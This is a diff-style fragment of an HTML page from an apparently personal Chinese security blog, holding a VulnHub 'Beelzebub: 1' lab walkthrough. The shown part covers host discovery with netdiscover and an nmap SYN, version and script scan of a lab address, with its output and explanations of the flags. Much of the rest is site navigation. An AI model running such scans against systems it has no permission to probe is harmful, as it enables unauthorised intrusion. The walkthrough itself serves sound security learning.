-<img src=/icons/forward.svg class=book-icon alt=Forward></a></span></div><div class=book-comments></div><div class="book-copyright flex justify-center"><small>vnccer - <a href=https://creativecommons.org/licenses/by/4.0/legalcode>© CC BY 4.0</a></small></div><script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#beelzebub>Beelzebub</a><ul><li><a href=#识别目标主机ip地址>识别目标主机IP地址</a></li><li><a href=#nmap扫描>NMAP扫描</a></li><li><a href=#获得shell>获得shell</a></li><li><a href=#提权>提权</a></li></ul></li></ul></nav></div></aside></main></body></html>
+┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.242.230 -oN nmap_full_scan Nmap scan report for 192.168.242.230 Host is up (0.00076s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA) | 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA) |_ 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519) 80/tcp open tcpwrapped |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 235.55 seconds（ps：关闭梯子），-sS是TCP SYN扫描（SYN“同步”，是TCP协议中的控制标志位，通过发送带有SYN标志位的TCP数据包到目标端口，根据接收到的响应类型，判断端口的开放状态，无需完成完整的三次握手），-sV是版本探测，-sC(Script)是默认脚本扫描，（-p-是全端口扫描，不用），（-T4(Timing Template)加快频率），-oN namp_full_scan(output noraml)将结果以标准格式保存到名为nmap_full_scan的文件中。 目标主机有2个开放端口22（SSH）、80（HTTP）">
+  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-05-15T14:20:47+08:00">
+  <meta itemprop="wordCount" content="1790">
+
+<title>Beelzebub: 1 | vnccer</title>
+<link rel="icon" href="/ak47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/">
+<link rel="stylesheet" href="/book.min.736951ca3ba5472b01b559ccf11c0bd72daa52528001c9a2789c1ea4a2c2c765.css" integrity="sha256-c2lRyjulRysBtVnM8RwL1y2qUlKAAcmieJwepKLCx2U=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.16385c4434a1482ed0003b37376b99c8fbc7cd5a048ac3c57bdc51900a0cdc7a.js" integrity="sha256-FjhcRDShSC7QADs3N2uZyPvHzVoEisPFe9xRkAoM3Ho=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  <script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']],
+      displayMath: [['$$', '$$'], ['\\[', '\\]']],
+      processEscapes: true,
+      processEnvironments: true
+    },
+    options: {
+      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c860f18c28389564163849da32ed5d14" class="toggle"  />
+    <label for="section-c860f18c28389564163849da32ed5d14" class="flex">
+      <a role="button" class="">
+        Project</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil/" class="">
+      vigil</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil_t/" class="">
+      vigil</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/project/vigil-abandoned-version/" class="">
+      vigil(abandoned version)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8d58ff5c5e366ab14339daed9d222b7f" class="toggle" checked />
+    <label for="section-8d58ff5c5e366ab14339daed9d222b7f" class="flex">
+      <a href="/docs/cybersecurity/" class="">
+        网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad627e53d6d1828a1435a85961eea27f" class="toggle"  />
+    <label for="section-ad627e53d6d1828a1435a85961eea27f" class="flex">
+      <a role="button" class="">
+        xnwlaqbc靶机记录</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/xnwlaqbc%E9%9D%B6%E6%9C%BA%E9%83%A8%E7%BD%B2%E4%B8%8E%E6%94%BB%E5%87%BB/" class="">
+      xnwlaqbc靶机部署与攻击</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/xnwlaqbc%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/DDos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95/" class="">
+      DDos攻击测试日志</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-20b418ba6aa317c76a5b35dea36ccbca" class="toggle"  />
+    <label for="section-20b418ba6aa317c76a5b35dea36ccbca" class="flex">
+      <a href="/docs/cybersecurity/DVWA/" class="">
+        DVWA</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/dvwa%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BF%AE%E5%A4%8D/" class="">
+      dvwa初始化修复</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Authorisation-Bypass/" class="">
+      Authorisation Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSRF/" class="">
+      CSRF</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Open-HTTP-Redirect/" class="">
+      Open HTTP Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/API/" class="">
+      api</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/CSP-Bypass/" class="">
+      CSP Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Cyptography/" class="">
+      Cryptography</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/Command-Injection/" class="">
+      Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/File-Inclusion/" class="">
+      File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/DVWA/SQL-Injection/" class="">
+      SQL Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/kali_linux%E5%9F%BA%E6%93%8D/" class="">
+      kali_linux基操</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="toggle"  />
+    <label for="section-aa6f3e63fd33f2e9fa1487b55c3551ba" class="flex">
+      <a role="button" class="">
+        SRC</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/SRC/%E8%81%94%E6%83%B3/" class="">
+      漏洞盒子：联想集团安全应急响应中心</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/SRC/stepfun/" class="">
+      漏洞盒子：阶跃星辰安全应急响应中心</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4ae5ffa90962cdf2660fe74526a01436" class="toggle"  />
+    <label for="section-4ae5ffa90962cdf2660fe74526a01436" class="flex">
+      <a role="button" class="">
+        Vulnerabilities</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/Apache-Log4j2CVE-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/" class="">
+      基于docker的log4j2（CVE-2021-44228）漏洞（源问题复现失败）</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnerabilities/log4j2.8.1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="">
+      log4j2.8.1漏洞复现</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e003e03c1feb2b65c7b35f539ae39c73" class="toggle" checked />
+    <label for="section-e003e03c1feb2b65c7b35f539ae39c73" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="toggle" checked />
+    <label for="section-ac34f5c7f66ad3765e4c61f98a3f46fd" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_drippingblues/" class="">
+      drippingblues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/" class="">
+      doubletrouble: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Beelzebub_1/" class="active">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/" class="">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad44293ee93b1d26cf7c58190e7d4815" class="toggle"  />
+    <label for="section-ad44293ee93b1d26cf7c58190e7d4815" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Corrosion2/" class="">
+      Corrosion: 2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Thales/" class="">
+      Thales</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub_Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fb378fb748ece0ae1fdeedef24da3db6" class="toggle"  />
+    <label for="section-fb378fb748ece0ae1fdeedef24da3db6" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/hard/vulnhub_Matrix-Breakout_-2_Morpheus/" class="">
+      Matrix-Breakout: 2 Morpheus</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="toggle"  />
+    <label for="section-5b607fcbb0b7c699a3da0e65a2ffed9b" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-7a6315a3240f7682f305097cdf53ea82" class="toggle"  />
+    <label for="section-7a6315a3240f7682f305097cdf53ea82" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/CTF/easy/CTF-web-low/" class="">
+      web-low</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-f08add9f101710f9ba3d484a35d5581b" class="toggle"  />
+    <label for="section-f08add9f101710f9ba3d484a35d5581b" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-1fdf586d1ea5885edf0672ce206f530c" class="toggle"  />
+    <label for="section-1fdf586d1ea5885edf0672ce206f530c" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-94ed7c835fd2d66c69e86ff967d092f9" class="toggle"  />
+    <label for="section-94ed7c835fd2d66c69e86ff967d092f9" class="flex">
+      <a href="/docs/papers/" class="">
+        论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8EBERT-CNN%E7%9A%84Webshell%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="">
+      基于 BERT-CNN 的 Webshell 流量检测系统设计与实现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E5%8F%AF%E5%8F%98%E9%95%BF%E5%BA%8F%E5%88%97%E7%9A%84%E6%81%B6%E6%84%8F%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于可变长序列的恶意加密流量检测方法</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT/" class="">
+      ET-BERT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/ET-BERT%E5%A4%8D%E7%8E%B0/" class="">
+      ET-BERT复现</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%9F%BA%E7%A1%80/" class="">
+      加密流量基础</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E5%9F%BA%E4%BA%8E%E7%AA%81%E5%8F%91%E7%89%B9%E5%BE%81%E8%AF%8D%E5%85%83%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/" class="">
+      基于突发特征词元自学习的未知加密恶意流量检测方法</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/papers/%E6%95%B0%E6%8D%AE%E9%9B%86%E5%88%86%E6%9E%90/" class="">
+      数据集分析</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="toggle"  />
+    <label for="section-3db2415e2c74c9bfbf1d5e6eb6dbf6ed" class="flex">
+      <a role="button" class="">
+        工作</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/AI%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83/" class="">
+      AI安全思考</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c262361fe9aa48cd5d939ca8724680d" class="toggle"  />
+    <label for="section-2c262361fe9aa48cd5d939ca8724680d" class="flex">
+      <a role="button" class="">
+        leetcode</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c1a97b113c65b26353860b399a4f8855" class="toggle"  />
+    <label for="section-c1a97b113c65b26353860b399a4f8855" class="flex">
+      <a role="button" class="">
+        哈希</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/leetcode/1.%E5%93%88%E5%B8%8C/1.%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/" class="">
+      1.两数之和</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/work/%E5%AE%9E%E4%B9%A0%E7%AE%80%E5%8E%86/" class="">
+      实习简历</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-8ebb29a2ddfb039e11169448c9cf3620" class="toggle"  />
+    <label for="section-8ebb29a2ddfb039e11169448c9cf3620" class="flex">
+      <a href="/docs/skills/" class="">
+        技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      git使用指南</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/Hugo%E6%9E%B6%E6%9E%84%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97/" class="">
+      Hugo架构网站搭建指南</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/linux_clash%E9%83%A8%E7%BD%B2/" class="">
+      linux clash部署</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/pyenv%E7%AE%A1%E7%90%86python%E7%89%88%E6%9C%AC/" class="">
+      pyenv管理python版本</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega_mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega_mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win&#43;r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win&#43;r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/windows%E7%BB%88%E7%AB%AF%E8%B5%B0%E4%BB%A3%E7%90%86/" class="">
+      windows终端/git 走代理</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali_linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/" class="">
+      基于vmware的kali_linux下的docker部署(坑多)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d096fa83268a84183f67ef634318f12c" class="toggle"  />
+    <label for="section-d096fa83268a84183f67ef634318f12c" class="flex">
+      <a href="/docs/AI/" class="">
+        AI</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/claude-code-cli/" class="">
+      claude code cli</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/AI/%E4%B8%BB%E6%B5%81AI%E5%AE%9A%E4%BB%B7/" class="">
+      主流AI定价</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-854542c26bded6389f67b522f4182c5e" class="toggle"  />
+    <label for="section-854542c26bded6389f67b522f4182c5e" class="flex">
+      <a role="button" class="">
+        导航门户</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E7%BD%91%E5%AE%89/" class="">
+      网安</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E6%96%87/" class="">
+      论文</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E5%B7%A5%E4%BD%9C/" class="">
+      工作</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Function/" class="">
+      Function</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/AI/" class="">
+      AI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/Life/" class="">
+      Life</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E8%AE%BA%E5%9D%9B/" class="">
+      论坛</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/navigation/%E6%9C%BA%E5%9C%BA/" class="">
+      机场</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="Blog">Blog</a></li><li><a href="https://github.com/vnccer" target="_blank" rel="noopener">Github</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Beelzebub: 1</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#beelzebub">Beelzebub</a>
+      <ul>
+        <li><a href="#识别目标主机ip地址">识别目标主机IP地址</a></li>
+        <li><a href="#nmap扫描">NMAP扫描</a></li>
+        <li><a href="#获得shell">获得shell</a></li>
+        <li><a href="#提权">提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="beelzebub">Beelzebub<a class="anchor" href="#beelzebub">#</a></h1>
+<p>提示：You have to enumerate as much as you can and don&rsquo;t forget about the Base64.</p>
+<h2 id="识别目标主机ip地址">识别目标主机IP地址<a class="anchor" href="#%e8%af%86%e5%88%ab%e7%9b%ae%e6%a0%87%e4%b8%bb%e6%9c%baip%e5%9c%b0%e5%9d%80">#</a></h2>
+<p>这里用LingJing实验室环境，实则不需要识别，一般Kali中指令如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-SHELL" data-lang="SHELL"><span style="display:flex;"><span>sudo netdiscover -i eth1
+</span></span><span style="display:flex;"><span>ip addr</span></span></code></pre></div><p>192.168.242.230</p>
+<h2 id="nmap扫描">NMAP扫描<a class="anchor" href="#nmap%e6%89%ab%e6%8f%8f">#</a></h2>
+<p>利用NMAP对目标主机进行全端口扫描，</p>
